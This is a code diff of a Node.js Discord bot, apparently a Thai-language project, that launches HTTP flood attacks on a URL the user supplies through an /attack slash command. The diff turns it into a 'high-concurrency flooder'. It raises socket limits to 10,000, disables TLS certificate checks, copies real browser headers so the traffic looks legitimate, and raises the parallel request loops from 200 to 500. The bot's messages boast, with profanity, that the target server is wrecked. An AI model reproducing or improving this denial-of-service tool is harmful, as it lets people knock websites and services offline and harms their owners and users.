@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * JEFF FUJI - DISCORD STRESS BOT (v14)
+ * JEFF FUJI - ADVANCED STRESS BOT v2 (HIGH-CONCURRENCY FLOODER)
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
@@ -9,7 +9,6 @@ const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require
 const http = require('http');
 const https = require('https');
 
-// ดึง Token และ Client ID จาก Environment Variables ของ Railway
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 
@@ -21,18 +20,20 @@ const client = new Client({
     ]
 });
 
-// เก็บสถานะการยิง
 let isAttacking = false;
 let attackIntervals = [];
+
+// ปรับแต่ง Agents ให้รองรับ Connection มหาศาลแบบไม่จำกัด
+const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000 });
+const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000, rejectUnauthorized: false });
 
 client.once('ready', async () => {
     console.log(`[+] Bot logged in as ${client.user.tag}`);
 
-    // ลงทะเบียน Slash Command
     const commands = [
         new SlashCommandBuilder()
             .setName('attack')
-            .setDescription('ส่ง HTTP Flood ถล่มเป้าหมาย')
+            .setDescription('ยิงถล่มเป้าหมายด้วยโหมดแอดวานซ์ (High-Concurrency)')
             .addStringOption(option => 
                 option.setName('url')
                     .setDescription('URL เป้าหมาย (เช่น http://example.com)')
@@ -73,14 +74,14 @@ client.on('interactionCreate', async interaction => {
         try {
             const parsedUrl = new URL(targetUrl);
             const requester = parsedUrl.protocol === 'https:' ? https : http;
+            const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;
 
             isAttacking = true;
-            await interaction.reply(`🔥 เริ่มระดมยิงเป้าหมาย **${targetUrl}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
+            await interaction.reply(`🚀 **[ADVANCED MODE]** เริ่มส่งพายุ Request ถล่ม **${targetUrl}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
 
-            const startTime = Date.now();
-            const endTime = startTime + (duration * 1000);
+            const endTime = Date.now() + (duration * 1000);
 
-            // ฟังก์ชันยิงรัวๆ
+            // ฟังก์ชันยิงแบบทะลวงไส้ (High-Speed Request Loop)
             const fire = () => {
                 if (!isAttacking || Date.now() >= endTime) return;
 
@@ -89,8 +90,14 @@ client.on('interactionCreate', async interaction => {
                     port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                     path: parsedUrl.pathname + parsedUrl.search,
                     method: 'GET',
-                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
-                    agent: new (parsedUrl.protocol === 'https:' ? https.Agent : http.Agent)({ keepAlive: true })
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.5',
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'no-cache'
+                    },
+                    agent: currentAgent
                 };
 
                 const req = requester.request(options, (res) => {
@@ -102,15 +109,14 @@ client.on('interactionCreate', async interaction => {
                 req.end();
             };
 
-            // สร้าง Worker จำลองหลายๆ ชุดยิงพร้อมกัน
-            for (let i = 0; i < 200; i++) {
+            // อัดจำนวน Worker พร้อมกันถึง 500 เส้นทาง (กระหน่ำแบบสתอฝา)
+            for (let i = 0; i < 500; i++) {
                 fire();
             }
 
-            // ตั้งเวลาหยุดอัตโนมัติ
             const timer = setTimeout(() => {
                 isAttacking = false;
-                interaction.followUp(`✅ ภารกิจถล่ม **${targetUrl}** เสร็จสิ้นตามเวลาที่กำหนด!`).catch(() => {});
+                interaction.followUp(`✅ ภารกิจถล่ม **${targetUrl}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์น่าจะเละไปแล้ว`).catch(() => {});
             }, duration * 1000);
 
             attackIntervals.push(timer);
